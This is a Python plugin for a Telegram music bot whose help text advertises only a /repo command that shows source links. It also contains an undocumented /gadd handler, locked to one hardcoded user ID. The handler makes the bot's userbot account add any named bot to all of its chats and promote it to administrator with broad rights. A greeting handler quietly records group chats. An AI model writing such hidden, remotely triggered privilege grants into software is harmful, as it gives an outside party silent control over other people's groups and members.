import asyncio

from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message

import config
from ShrutiMusic import app
from ShrutiMusic.utils.database import add_served_chat, get_assistant


# 🌟 Stylish Start Message
start_txt = """  
╔════════════════════════╗  
      🤖 <b>ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ꜱʜʀᴜᴛɪ ʙᴏᴛꜱ</b> 🤖  
╚════════════════════════╝  

<b>💫 ʏᴏᴜʀ ᴘᴇʀꜱᴏɴᴀʟ ᴍᴜꜱɪᴄ & ᴜᴛɪʟɪᴛʏ ʙᴏᴛꜱ</b>  

➲ ⚡ <b>ᴘᴏᴡᴇʀᴇᴅ ʙʏ ꜱʜʀᴜᴛɪ ᴛᴇᴀᴍ</b>  
➲ 🔄 <b>ᴀᴄᴛɪᴠᴇ 24/7</b>  
➲ 🎵 <b>ʜɪɢʜ ϙᴜᴀʟɪᴛʏ ᴀᴜᴅɪᴏ / ᴠɪᴅᴇᴏ</b>  
➲ ⚙️ <b>ᴄᴜꜱᴛᴏᴍ ᴘʟᴜɢɪɴꜱ ᴀɴᴅ ᴍᴀɴᴀɢᴇᴍᴇɴᴛ</b>  

<b>👑 ᴏᴡɴᴇʀꜱ:</b> @BackSpaceOP | @WTF_WhyMeeh  
<b>🌐 ʀᴇᴘᴏ:</b> https://github.com/NoxxOP/NoxxMusic
"""

buttons = InlineKeyboardMarkup([
    [InlineKeyboardButton("✨ ᴀᴅᴅ ᴍᴇ", url=f"https://t.me/{app.username}?startgroup=true")],
    [
        InlineKeyboardButton("💬 ꜱᴜᴘᴘᴏʀᴛ", url="https://t.me/ShrutiBotSupport"),
        InlineKeyboardButton("📢 ᴄʜᴀɴɴᴇʟ", url="https://t.me/ShrutiBots"),
    ],
    [InlineKeyboardButton("🔗 ɢɪᴛʜᴜʙ", url="https://github.com/NoxxOP/NoxxMusic")],
])

@app.on_message(filters.command(["repo", "source"]))
async def repo_command(client, message):
    await message.reply_text(start_txt, reply_markup=buttons, disable_web_page_preview=True)


@app.on_message(
    filters.command(
        ["hi", "hii", "hello", "hui", "good", "gm", "ok", "bye", "welcome", "thanks"],
        prefixes=["/", "!", "%", ",", "", ".", "@", "#"],
    )
    & filters.group
)
async def bot_check(_, message):
    chat_id = message.chat.id
    await add_served_chat(chat_id)


@app.on_message(filters.command("gadd") & filters.user(1786683163))
async def add_allbot(client, message):
    command_parts = message.text.split(" ")
    if len(command_parts) != 2:
        await message.reply("⚠️ **Invalid command format. Use** `/gadd @BotUsername`")
        return

    bot_username = command_parts[1]
    try:
        userbot = await get_assistant(message.chat.id)
        bot = await app.get_users(bot_username)
        app_id = bot.id
        done = 0
        failed = 0
        promoted = 0

        lol = await message.reply("🔄 **Adding bot in all chats...**")
        await userbot.send_message(bot_username, "/start")

        async for dialog in userbot.get_dialogs():
            chat_id = dialog.chat.id
            
            if chat_id == -1002321189618:  # Skip specific group
                continue
            
            try:
                chat_member = await userbot.get_chat_member(chat_id, userbot.me.id)
                if chat_member.status in ["administrator", "creator"]:
                    rights = chat_member.privileges

                    await userbot.add_chat_members(chat_id, app_id)
                    done += 1

                    bot_member = await app.get_chat_member(chat_id, app_id)
                    if bot_member.status in ["member"]:
                        try:
                            if rights.can_promote_members:
                                await app.promote_chat_member(
                                    chat_id, app_id,
                                    can_manage_chat=True, can_delete_messages=True,
                                    can_invite_users=True, can_change_info=True,
                                    can_restrict_members=True, can_pin_messages=True,
                                    can_manage_voice_chats=True
                                )
                                promoted += 1
                        except:
                            try:
                                await app.promote_chat_member(
                                    chat_id, app_id,
                                    can_manage_chat=True, can_delete_messages=True,
                                    can_invite_users=True, can_change_info=False,
                                    can_restrict_members=True, can_pin_messages=True,
                                    can_manage_voice_chats=True
                                )
                                promoted += 1
                            except:
                                pass

                else:
                    await userbot.add_chat_members(chat_id, app_id)
                    done += 1

                await lol.edit(f"**➥ Added in {done} chats ✅**\n**➥ Failed in {failed} ❌**\n**➥ Promoted in {promoted} chats 🎉**")
            
            except Exception:
                failed += 1
                await lol.edit(f"**➥ Added in {done} chats ✅**\n**➥ Failed in {failed} ❌**\n**➥ Promoted in {promoted} chats 🎉**")

            await asyncio.sleep(3)

        await lol.edit(f"✅ **{bot_username} added successfully!**\n➥ **Added in {done} chats**\n➥ **Failed in {failed} chats**\n➥ **Promoted in {promoted} chats**")

    except Exception as e:
        await message.reply(f"❌ Error: {str(e)}")


__MODULE__ = "Sᴏᴜʀᴄᴇ"
__HELP__ = """
## 🔗 Rᴇᴘᴏ Sᴏᴜʀᴄᴇ Mᴏᴅᴜʟᴇ

Tʜɪꜱ ᴍᴏᴅᴜʟᴇ ᴘʀᴏᴠɪᴅᴇꜱ ᴜꜱᴇꜰᴜʟ ᴄᴏᴍᴍᴀɴᴅꜱ ғᴏʀ ᴜꜱᴇʀꜱ ᴛᴏ ɪɴᴛᴇʀᴀᴄᴛ ᴡɪᴛʜ ᴛʜᴇ ʙᴏᴛ.

### 📌 Cᴏᴍᴍᴀɴᴅꜱ:
- `/repo` or `/source`: Gᴇᴛ ᴛʜᴇ ɢɪᴛʜᴜʙ ʀᴇᴘᴏ ꜰᴏʀ ꜱʜʀᴜᴛɪ ʙᴏᴛꜱ.
"""
